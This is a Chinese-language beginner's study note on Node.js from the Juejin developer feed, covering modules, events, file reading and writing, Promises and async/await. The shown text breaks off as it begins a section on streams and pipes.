<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Nodejs 学习记录]]></title>    <link>https://juejin.cn/post/7602401081265946660</link>    <guid>https://juejin.cn/post/7602401081265946660</guid>    <pubDate>2026-02-03T12:22:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602401081265946660" data-draft-id="7602401081264652324" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nodejs 学习记录"/> <meta itemprop="keywords" content="Node.js"/> <meta itemprop="datePublished" content="2026-02-03T12:22:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="临在linzai"/> <meta itemprop="url" content="https://juejin.cn/user/974584529557604"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nodejs 学习记录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/974584529557604/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    临在linzai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:22:20.000Z" title="Tue Feb 03 2026 12:22:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.Nodejs的优点和环境搭建</h2>
<h3 data-id="heading-1">Nodejs的优点</h3>
<ol>
<li>运行在v8JavaScript引擎上(高性能)</li>
<li>事件驱动</li>
<li>非阻塞的IO模型</li>
<li>丰富的生态圈(npm下载资源)</li>
</ol>
<h3 data-id="heading-2">Nodejs的安装</h3>
<p>点击 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdownload" target="_blank" title="https://nodejs.org/en/download" ref="nofollow noopener noreferrer">Node.js — Download Node.js®</a> 安装新版本的nodejs</p>
<h2 data-id="heading-3">2.全局对象</h2>
<p>Nodejs提供很多全局对象,这些对象都可以直接使用,不需要做单独的引入</p>
<p><strong>日志信息打印</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'nihao'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'nihao'</span>);
</code></pre>
<p><strong>定时器</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
   i += <span class="hljs-number">1</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'i = '</span> + i )
   <span class="hljs-keyword">if</span>(i &gt;= <span class="hljs-number">5</span>){
       <span class="hljs-built_in">clearInterval</span>(timer)
   }
}, <span class="hljs-number">1000</span>);
</code></pre>
<p><strong>一些常用的全局对象</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>（__dirname)；<span class="hljs-comment">//打印出来当前路径</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>（__filename）；<span class="hljs-comment">//打印出来包含文件名称</span>
</code></pre>
<h2 data-id="heading-4">3.回调函数</h2>
<p><strong>定义</strong>:是指作为参数传递给另一个函数，并在该函数内部被调用的函数。</p>
<p>我们需要熟悉一下回调函数,因为在整个nodejs中,慢慢的都是回调函数</p>
<p><strong>基础函数</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hi"</span>);
}

<span class="hljs-keyword">let</span>  sayBye = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name + <span class="hljs-string">"bye"</span>);
}
<span class="hljs-title function_">sayHi</span>()
<span class="hljs-title function_">sayBye</span>(<span class="hljs-string">"hzh"</span>)
</code></pre>
<p><strong>回调函数</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">callFunction</span>(<span class="hljs-params">callback,name</span>){
    <span class="hljs-title function_">callback</span>(name);
}

<span class="hljs-title function_">callFunction</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name + <span class="hljs-string">":bye"</span>);
},<span class="hljs-string">"hzh"</span>)
</code></pre>
<h2 data-id="heading-5">4.模块(Commonjs规范)</h2>
<p>在JavaScript的ES5版本中,最大的问题就是没有模块的概念,但是nodejs中,增加了commonjs规范来处理这一问题</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//utils.js</span>
<span class="hljs-keyword">let</span> adder = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'两数之和为 '</span> + (a + b);
}

<span class="hljs-keyword">let</span> arrLength = <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'长度为 '</span> + arr.<span class="hljs-property">length</span>;
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    adder,
    arrLength
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">const</span> {<span class="hljs-attr">adder</span>: add,<span class="hljs-attr">arrLength</span>: length} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./utils.js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">length</span>([ <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> ]));
</code></pre>
<h3 data-id="heading-6"><strong>拓展</strong></h3>
<p>export 也可以直接导出文件,这是<strong>ES6模块</strong>,和Commonjs还是区别的</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//utils.js</span>
<span class="hljs-keyword">let</span> adder = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'两数之和为 '</span> + (a + b);
}

<span class="hljs-keyword">let</span> arrLength = <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'长度为 '</span> + arr.<span class="hljs-property">length</span>;
}

<span class="hljs-keyword">export</span> {adder,arrLength};
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">import</span> {adder,arrLength} <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils.js'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">adder</span>(<span class="hljs-number">10</span>,<span class="hljs-number">30</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">arrLength</span>([ <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> ]));
</code></pre>
<p><strong>ES6特点</strong>:</p>
<ul>
<li><strong>代码在用户浏览器中执行</strong></li>
<li><strong>无法直接访问服务器资源</strong>（文件系统、数据库等）</li>
<li><strong>通过网络请求与服务器通信</strong></li>
<li><strong>主要负责用户界面和交互</strong></li>
</ul>
<p><strong>Commonjs特点</strong>:</p>
<ul>
<li><strong>代码在服务器上执行</strong></li>
<li><strong>可以直接访问文件系统、数据库等</strong></li>
<li><strong>处理业务逻辑、数据存储等</strong></li>
<li><strong>向浏览器提供API服务</strong></li>
</ul>
<p>到后面基本都是统一使用ES6模块开发,在package.json文件中加入</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// package.json</span>
{
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"module"</span>
}
</code></pre>
<h2 data-id="heading-7">5.事件</h2>
<p>大多数Node.js核心API构建惯用异步事件驱动架构,其中某些类型的对象(又称触发器,Emitter)会触发命名事件来调用函数(又称监听器,Listener)</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//引入事件</span>
<span class="hljs-keyword">let</span> enents  =  <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-comment">//创建事件发射器对象</span>
<span class="hljs-keyword">let</span> eventEmitter = <span class="hljs-keyword">new</span> enents.<span class="hljs-title class_">EventEmitter</span>();
<span class="hljs-comment">//绑定事件及事件处理程序</span>
eventEmitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">"someEvent"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">arg1</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"someEvent 事件触发"</span>,arg1);
});
<span class="hljs-comment">//触发事件</span>
eventEmitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"someEvent"</span>,<span class="hljs-string">"hzh"</span>);
</code></pre>
<p>除了直接使用,我们还可以继承事件</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> events = <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-keyword">let</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">"util"</span>);

<span class="hljs-comment">//创建一个构造函数</span>
<span class="hljs-keyword">let</span> <span class="hljs-title class_">Person</span> =  <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}   

<span class="hljs-comment">//让Person继承事件发射器 inherits(继承,被继承)</span>
util.<span class="hljs-title function_">inherits</span>(<span class="hljs-title class_">Person</span>,events.<span class="hljs-property">EventEmitter</span>);

<span class="hljs-comment">//创建person对象</span>
<span class="hljs-keyword">let</span> hzh = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"hzh"</span>);
<span class="hljs-keyword">let</span> yj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"yj"</span>);
<span class="hljs-comment">//创建数组存放person对象</span>
<span class="hljs-keyword">let</span>  personArr = [hzh,yj];
<span class="hljs-comment">//绑定事件及事件处理程序</span>
personArr.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">person</span>){
    person.<span class="hljs-title function_">on</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hello my name is "</span>+ person.<span class="hljs-property">name</span> + <span class="hljs-string">":"</span> + message);
    }); 
});
<span class="hljs-comment">//触发事件</span>
hzh.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">'帅气'</span>);
yj.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">"莎彼"</span>);
</code></pre>
<h3 data-id="heading-8">拓展</h3>
<p>上面的是es5之前版本的写法了,咱们后续基本使用es6语法开发,下面是es6的写法,对比之前版本的优点:<strong>更加的清晰</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-comment">// 使用 extend 直接继承 EventEmitter</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">EventEmitter</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">super</span>();<span class="hljs-comment">//es6新特性</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
}

<span class="hljs-comment">//创建person对象</span>
<span class="hljs-keyword">let</span> hzh = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"hzh"</span>);
<span class="hljs-keyword">let</span> yj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"yj"</span>);
<span class="hljs-comment">//创建数组存放person对象</span>
<span class="hljs-keyword">let</span>  personArr = [hzh,yj];
<span class="hljs-comment">//绑定事件及事件处理程序</span>
personArr.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">person</span>){
    person.<span class="hljs-title function_">on</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hello my name is "</span>+ person.<span class="hljs-property">name</span> + <span class="hljs-string">":"</span> + message);
    }); 
});
<span class="hljs-comment">//触发事件</span>
hzh.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">'帅气'</span>);
yj.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">"莎彼"</span>);
</code></pre>
<h2 data-id="heading-9">6.文件读写</h2>
<p>在Nodejs中有文件系统，是对本地文件进行读写操作，当然，如果要使用我们需要引入fs对象</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-comment">//readFileSync(文件地址,编码格式) 同步读取文件 </span>
<span class="hljs-keyword">let</span> readMe = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">let</span> writeMe = <span class="hljs-string">"hello yj"</span>;
<span class="hljs-comment">//writeFileSync(文件地址,写入内容) 同步写入文件,如没有文件,则创建新文件</span>
fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">"./writeMe.txt"</span>,writeMe);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(readMe);
</code></pre>
<p>同时他也有同步和异步的问题,fs.readFile本身是异步执行</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);
<span class="hljs-comment">//控制台输出结果</span>
finshed
hello hzh
</code></pre>
<p>当我们添加了**同步 while **</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
    <span class="hljs-keyword">if</span>(err){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"读取文件失败"</span>);    
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    }
});
<span class="hljs-comment">//在这里我们会等待三秒</span>
<span class="hljs-keyword">let</span> waitTill = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() + <span class="hljs-number">3</span>*<span class="hljs-number">1000</span>);
<span class="hljs-keyword">while</span>(waitTill &gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()){}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);


<span class="hljs-comment">//控制台输出结果</span>
<span class="hljs-comment">//等待三秒之后</span>
finshed
hello hzh
</code></pre>
<p><strong>解决方案</strong></p>
<p>对读写都使用异步的方案处理</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> readMe = fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"./readMe.txt"</span>,<span class="hljs-string">'utf-8'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err,data</span>){
    fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">"./writeMe.txt"</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"文件写入成功"</span>);
    });
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"finshed"</span>);
</code></pre>
<h3 data-id="heading-10">拓展</h3>
<p>现代js用的更多的 <strong>Promise</strong> + <strong>async/await</strong></p>
<p><strong>Promise</strong> 是一个<strong>表示异步操作最终完成或失败的对象</strong>。</p>
<p><strong>Promise</strong> 有三种状态 <strong>fulfilled</strong>(成功) 、<strong>rejected</strong>(失败) 、<strong>pending</strong>(等待)</p>
<p>通俗一点的说法:  resolve表示成功,reject表示失败,只有成功和失败,两者不会同时出现</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fetchData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-comment">//pending</span>
    <span class="hljs-keyword">let</span> num = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span>){
        <span class="hljs-comment">//fulfilled</span>
        <span class="hljs-title function_">resolve</span>(num)
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-comment">//rejected</span>
        <span class="hljs-title function_">reject</span>(<span class="hljs-string">"错误"</span>)
    }
})
</code></pre>
<p>常用的就是 <strong>.then()</strong> 和 <strong>.catch()</strong>   <strong>.finally()</strong> 不咋见</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fetchData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-keyword">let</span> num = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span>){
        <span class="hljs-title function_">resolve</span>(num)
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-title function_">reject</span>(<span class="hljs-string">"错误"</span>)
    }
    
})

fetchData.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"成功:"</span>, result); <span class="hljs-comment">//输出结果 成功:1</span>
    }).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"失败:"</span>, error); <span class="hljs-comment">//输出结果 失败:错误</span>
    }).<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"操作完成"</span>);
    });

<span class="hljs-comment">//控制台不会同时出现 成功:1 失败:错误</span>
</code></pre>
<p><strong>async/await</strong> 看起来像同步，但本质还是异步</p>
<p><strong>await 的工作流程：</strong></p>
<ol>
<li>执行到 <code>await</code> 时，函数会<strong>暂停</strong></li>
<li>但不是阻塞整个程序，而是<strong>把控制权交还给事件循环</strong></li>
<li>等其他同步代码执行完后，文件读取完成了</li>
<li>事件循环重新激活这个 async 函数，从 await 后面继续执行</li>
</ol>
<p>看下面代码</p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. 脚本开始"</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2. 进入async函数"</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"3. 准备读取文件"</span>);
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-property">promises</span>.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./file.txt'</span>, <span class="hljs-string">'utf8'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"4. 文件读取完成:"</span>, data.<span class="hljs-property">length</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"5. 准备写入文件"</span>); 
    <span class="hljs-keyword">await</span> fs.<span class="hljs-property">promises</span>.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">'./output.txt'</span>, data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"6. 文件写入完成"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"7. 调用async函数"</span>);
<span class="hljs-title function_">main</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"8. async函数调用完毕"</span>);

<span class="hljs-comment">// 实际输出顺序：</span>
<span class="hljs-comment">// 1. 脚本开始</span>
<span class="hljs-comment">// 7. 调用async函数  </span>
<span class="hljs-comment">// 2. 进入async函数</span>
<span class="hljs-comment">// 3. 准备读取文件</span>
<span class="hljs-comment">// 8. async函数调用完毕</span>
<span class="hljs-comment">// 4. 文件读取完成: 123</span>
<span class="hljs-comment">// 5. 准备写入文件</span>
<span class="hljs-comment">// 6. 文件写入完成</span>
</code></pre>
<p><strong>Promise + async/await 的优势：</strong></p>
<ul>
<li>✅ <strong>代码更清晰</strong>：像写同步代码一样写异步代码</li>
<li>✅ <strong>错误处理更简单</strong>：使用 try/catch</li>
<li>✅ <strong>调试更方便</strong>：堆栈跟踪更清晰</li>
<li>✅ <strong>组合更灵活</strong>：Promise.all、Promise.race 等</li>
<li>✅ <strong>现代标准</strong>：是 JavaScript 异步编程的未来</li>
</ul>
<h2 data-id="heading-11">7.流和管道</h2>
<p>流的概念并不难理解，例如：我们平时前后端交互其实就是转换成流来进行交互的，我们之前也讲过文件的读写，文件的读写也属于流的操作的体现。这是如果文件特别大的时候，我们还是要采取buffer处理</p>
<p>我们现在命令行中操作一个基础操作</p>
<pre><code class="hljs language-js" lang="js">ls

ls | grep <span class="hljs-title function_">app</span>(注意 app 要对应你的文件名 比如 code.<span class="hljs-property">js</span> 对应为 ls | grep code)
</code></pre>
<p>ls | grep app 这个命令在 <strong>linux</strong> 或者 <strong>mac</strong> 才合适</p>
<p>如果是 <strong>window</strong> ,对应命令应该为 dir | findstr app</p>
<pre><code class="hljs language-js" lang="js">dir | findstr <span class="hljs-title function_">app</span>(注意 app 要对应你的文件名 比如 code.<span class="hljs-property">js</span> 对应为 ls | grep code)
</code></pre>
<p>下面代码当执行 node code 命令后</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">let</span> myReadStream = fs.<span class="hljs-title function_">createReadStream</span>(__dirname + <span class="hljs-string">"/readMe.txt"</span>);

